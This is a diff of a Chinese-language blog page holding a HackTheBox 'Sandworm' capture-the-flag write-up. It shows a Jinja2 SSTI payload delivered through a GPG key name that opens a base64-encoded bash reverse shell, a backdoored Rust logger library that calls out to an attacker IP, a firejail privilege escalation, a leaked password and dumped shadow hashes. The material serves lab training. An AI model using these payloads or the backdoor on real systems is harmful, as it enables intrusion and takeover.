@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Sandworm 10.10.11.218   端口扫描22，80，443: 12345678910111213141516171819202122232425$ nmap -sC -sV -Pn 10.10.11.218Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Sandworm 10.10.11.218                                                                                                              端口扫描22，80，443: 1234567891011">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Sandworm - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2023/06/19/Sandworm-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Sandworm 10.10.11.218   端口扫描22，80，443: 12345678910111213141516171819202122232425$ nmap -sC -sV -Pn 10.10.11.218Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Sandworm 10.10.11.218                                                                                                              端口扫描22，80，443: 1234567891011">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061901.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061902.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061903.jpg">
@@ -139,7 +139,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -228,7 +228,14 @@
 <li><a href="https://app.hackthebox.com/machines/Sandworm" target="_blank" rel="noopener">https://app.hackthebox.com/machines/Sandworm</a></li>
 <li>10.10.11.218</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061901.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061901.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22，80，443:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.218</span></span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-19 13:35 CST</span><br><span class="line">Nmap scan report for 10.10.11.218</span><br><span class="line">Host is up (0.093s latency).</span><br><span class="line">Not shown: 995 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE    SERVICE     VERSION</span><br><span class="line">22/tcp   open     ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)</span><br><span class="line">|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)</span><br><span class="line">80/tcp   open     http        nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to https://ssa.htb/</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">443/tcp  open     ssl/http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA</span><br><span class="line">| Not valid before: 2023-05-04T18:03:25</span><br><span class="line">|_Not valid after:  2050-09-19T18:03:25</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Secret Spy Agency | Secret Security Service</span><br><span class="line">1096/tcp filtered cnrprotocol</span><br><span class="line">9207/tcp filtered wap-vcal-s</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 49.02 seconds</span><br></pre></td></tr></table></figure>
 
@@ -238,11 +245,32 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.218 ssa.htb</span><br></pre></td></tr></table></figure>
 
 <p>flask做的某安全公司官网：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061902.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061902.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="PGP"><a href="#PGP" class="headerlink" title="PGP"></a>PGP</h1><p>contact那里需要提交pgp加密的信息：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061903.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061903.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>根据提示点进guide，里面是一些gpg功能，加解密，验证签名之类的:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061904.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061904.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="Vertify-Signature"><a href="#Vertify-Signature" class="headerlink" title="Vertify Signature"></a>Vertify Signature</h2><p>后面操作生成一个新的密钥对吧，因为涉及到一些属性修改，避免影响主密钥的功能：</p>
 <ul>
 <li>GPG入门教程 - 阮一峰的网络日志<br><a href="https://www.ruanyifeng.com/blog/2013/07/gpg.html" target="_blank" rel="noopener">https://www.ruanyifeng.com/blog/2013/07/gpg.html</a></li>
@@ -250,7 +278,14 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gpg --quick-gen-key miao</span><br><span class="line"></span><br><span class="line">gpg --armor --export miao &gt; pubkey.asc</span><br><span class="line">echo 'miao' | gpg --clearsign</span><br></pre></td></tr></table></figure>
 
 <p>使用公钥和签名信息测试验证签名功能，发现输出信息中包含我们密钥设置的一些属性：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061905.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061905.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>修改gpg密钥中的属性,根据前面知道是Flask，测试SSTI：</p>
 <ul>
 <li>Modify the GPG UID name - SoByte<br><a href="https://www.sobyte.net/post/2021-12/modify-gpg-uid-name/" target="_blank" rel="noopener">https://www.sobyte.net/post/2021-12/modify-gpg-uid-name/</a></li>
@@ -258,35 +293,112 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gpg --edit-key miao</span><br><span class="line"><span class="meta">gpg&gt;</span><span class="bash"> adduid</span></span><br><span class="line">Real name: &#123;&#123;7*7&#125;&#125;</span><br><span class="line">Email address: miao@miao.com</span><br><span class="line">Comment:</span><br><span class="line">You selected this USER-ID:</span><br><span class="line">    "&#123;&#123;7*7&#125;&#125; &lt;miao@miao.com&gt;"</span><br></pre></td></tr></table></figure>
 
 <p>就是根据文章一步步来，完成后重新进行前面的步骤，验证签名，发现SSTI执行成功：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061906.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061907.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061906.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061907.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><p>然后就是测试各种命令，最终得到atlas shell：</p>
 <ul>
 <li>PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings<br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2</a></li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/<span class="number">10.10</span><span class="number">.14</span><span class="number">.16</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE2LzQ0NDQgMD4mMQo=</span><br><span class="line"></span><br><span class="line">&#123;&#123; self.__init__.__globals__.__builtins__.__import__(<span class="string">'os'</span>).popen(<span class="string">'bash -c "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE2LzQ0NDQgMD4mMQo= | base64 -d | bash" '</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061908.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061908.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><h2 id="firejail"><a href="#firejail" class="headerlink" title="firejail"></a>firejail</h2><p>简单的枚举发现是在firejail沙箱里：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061909.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061909.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="httpid"><a href="#httpid" class="headerlink" title="httpid"></a>httpid</h2><p>httpie里面一层层翻，admin.json里得到silentobserver密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">silentobserver</span><br><span class="line">quietLiketheWind22</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061910.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061910.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>silentobserver用户ssh登录：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061911.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061911.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="信息-1"><a href="#信息-1" class="headerlink" title="信息"></a>信息</h1><p>silentobserver上下文中运行pspy(因为atlas在沙盒里，wget，curl之类的都用不了)，发现root用户定时在atlas用户的上下文中运行和编译在 Rust 中开发的 tipnet 项目:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061912.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061912.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="tipnet"><a href="#tipnet" class="headerlink" title="tipnet"></a>tipnet</h1><p>源码和二进制程序我们都有权限查看，测试运行，发现我们的操作都会记录在日志里：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061913.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061914.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061913.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061914.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="logger"><a href="#logger" class="headerlink" title="logger"></a>logger</h2><p>查看代码发现使用了一个外部库logger：</p>
 <ul>
 <li>Extern crates - The Rust Reference<br><a href="https://doc.rust-lang.org/reference/items/extern-crates.html" target="_blank" rel="noopener">https://doc.rust-lang.org/reference/items/extern-crates.html</a></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061915.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061915.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>而logger,当前用户有写权限:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061916.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061916.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>那就可以直接修改logger的代码来执行命令，参考这个,修改后不影响原本功能：</p>
 <ul>
 <li>rust-backdoors/reverse-shell/src/main.rs at master · LukeDSchenk/rust-backdoors · GitHub<br><a href="https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs" target="_blank" rel="noopener">https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs</a></li>
@@ -294,8 +406,22 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.16:7777/lib.rs -O lib.rs</span><br></pre></td></tr></table></figure>
 
 <p>修改后等待tipnet执行，得到没有限制的atlas,写公钥方便后续操作：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061917.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061918.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061917.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061918.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="lib-rs"><a href="#lib-rs" class="headerlink" title="lib.rs"></a>lib.rs</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> chrono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> std::fs::OpenOptions;</span><br><span class="line"><span class="keyword">use</span> std::io::Write;</span><br><span class="line"><span class="keyword">use</span> chrono::prelude::*;</span><br><span class="line"><span class="keyword">use</span> std::process::Command;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">log</span></span>(user: &amp;<span class="built_in">str</span>, query: &amp;<span class="built_in">str</span>, justification: &amp;<span class="built_in">str</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> command = <span class="string">"bash -i &gt;&amp; /dev/tcp/10.10.14.16/4444 0&gt;&amp;1"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> output = Command::new(<span class="string">"bash"</span>)</span><br><span class="line">        .arg(<span class="string">"-c"</span>)</span><br><span class="line">        .arg(command)</span><br><span class="line">        .output()</span><br><span class="line">        .expect(<span class="string">"not work"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> output.status.success() &#123;</span><br><span class="line">        <span class="keyword">let</span> stdout = <span class="built_in">String</span>::from_utf8_lossy(&amp;output.stdout);</span><br><span class="line">        <span class="keyword">let</span> stderr = <span class="built_in">String</span>::from_utf8_lossy(&amp;output.stderr);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">"standar output: &#123;&#125;"</span>, stdout);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">"error output: &#123;&#125;"</span>, stderr);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> stderr = <span class="built_in">String</span>::from_utf8_lossy(&amp;output.stderr);</span><br><span class="line">        eprintln!(<span class="string">"Error: &#123;&#125;"</span>, stderr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> now = Local::now();</span><br><span class="line">    <span class="keyword">let</span> timestamp = now.format(<span class="string">"%Y-%m-%d %H:%M:%S"</span>).to_string();</span><br><span class="line">    <span class="keyword">let</span> log_message = <span class="built_in">format!</span>(<span class="string">"[&#123;&#125;] - User: &#123;&#125;, Query: &#123;&#125;, Justification: &#123;&#125;\n"</span>, timestamp, user, query, justification);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> file = <span class="keyword">match</span> OpenOptions::new().append(<span class="literal">true</span>).create(<span class="literal">true</span>).open(<span class="string">"/opt/tipnet/access.log"</span>) &#123;</span><br><span class="line">        <span class="literal">Ok</span>(file) =&gt; file,</span><br><span class="line">        <span class="literal">Err</span>(e) =&gt; &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">"Error opening log file: &#123;&#125;"</span>, e);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="literal">Err</span>(e) = file.write_all(log_message.as_bytes()) &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">"Error writing to log file: &#123;&#125;"</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>suid firejail,类似之前的Cerberus：</p>
@@ -306,12 +432,33 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -user root 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/local/bin/firejail</span><br></pre></td></tr></table></figure>
 
 <p>能不能跳过中间步骤直接从silentobserver用户到这里的suid firejail呢，实际上是不行的，silentobserver没有权限执行firejail,而atlas用户在jailer组中可以执行：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061921.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061921.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>一步步来,还是一样的问题，给的sudo不行，但直接su可以：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget 10.10.14.16:7777/firejoin.py</span><br><span class="line"><span class="meta">#</span><span class="bash"> 第一个终端</span></span><br><span class="line">python3 firejoin.py</span><br><span class="line"><span class="meta">#</span><span class="bash"> 第二个终端</span></span><br><span class="line">firejail --join=13520</span><br><span class="line">su -</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061919.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061920.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061919.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061920.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$Pg7Bm6pt5ZGjXKjHtVx1A0$oUzCb1AdkT8LSqDw&#x2F;S8epzo8NulMfPH1siYjXUbZl0B:19395:0:99999:7:::</span><br><span class="line">silentobserver:$y$j9T$bCOHQ6BXJpACSRhEUptt50$2gOEbQ08M76nlLu6F5RJX61ufBUDSW67zVfwRdHcsI4:19394:0:99999:7:::</span><br><span class="line">atlas:$y$j9T$G9Wo78J1wNdBpflU3JDbb1$A087OjgjVVM7G&#x2F;DrtMLWev77DZfpOQU2iidRClpCJbD:19395:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 
